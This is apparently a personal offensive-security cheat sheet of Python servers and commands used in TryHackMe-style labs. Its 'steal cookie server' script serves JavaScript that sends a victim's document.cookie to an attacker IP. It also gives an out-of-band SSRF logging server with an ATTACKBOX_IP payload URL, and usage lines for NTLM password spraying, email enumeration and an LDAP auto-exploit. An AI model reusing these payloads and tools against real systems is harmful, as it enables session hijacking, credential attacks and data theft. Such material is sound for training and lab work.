# python file

---

## http

```bash
python -m SimpleHTTPServer 8090
python3 -m http.server 8090
```

## https

a simple web server 

Before running the https web server we will need to create an SSL certificate and key with the following command:

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname"
```

`python3 https.py`

***https.py***

<<< ./python/https.py

---

## Web Server

We can quickly set up a web server that responds with status 101 to every request with the following Python code:

`python3 myserver.py 5555`

***myserver.py***
```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
---

## steal cookie server

steal the user's cookie and send it to us

`sudo python3 server.py`

Note that the victim will make an additional request to port 8080; you can serve another Python web service by using:

`sudo python3 -m http.server 8080`

***server.py***
```python
#!/usr/bin/python3

    
from http.server import BaseHTTPRequestHandler, HTTPServer

class ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type","text/html")

            self.end_headers()
            self.wfile.write(b"fetch('http://10.10.153.2:8080/' + document.cookie)")

def run_server(port=1337):   
    server_address = ('', port)
    httpd = HTTPServer(server_address, ExploitHandler)
    print(f"Server running on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```

---

## Out-of-band SSRF

`sudo chmod +x server.py && sudo python3 server.py`

open the browser and open `http://example.com/profile.php?url=http://ATTACKBOX_IP:8080`, which will log the data in the `data.html`. 

***server.py***
```python
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.end_headers()

        # Log the POST data to data.html
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')
        response = f'THM, POST request! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('Server running on http://localhost:8080/')
    httpd.serve_forever()
```
---

## mail-check

check for valid emails in the target web app

<<< ./python/mail-check.py

---

## smbserver

Enter the command `python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp` to start the SMB server sharing the `/tmp` director

You can access the contents of the network share by entering the command `smbclient //ATTACKBOX_IP/logs -U guest -N`.

<<< ./python/smbserver.py

---

## LDAP-Auto-Exploit

<<< ./python/LDAP-Auto-Exploit.py

---

## ntlm-passwordspray

`python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>`

eg: `python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/`


***ntlm_passwordspray.py***

<<< ./python/ntlm_passwordspray.py
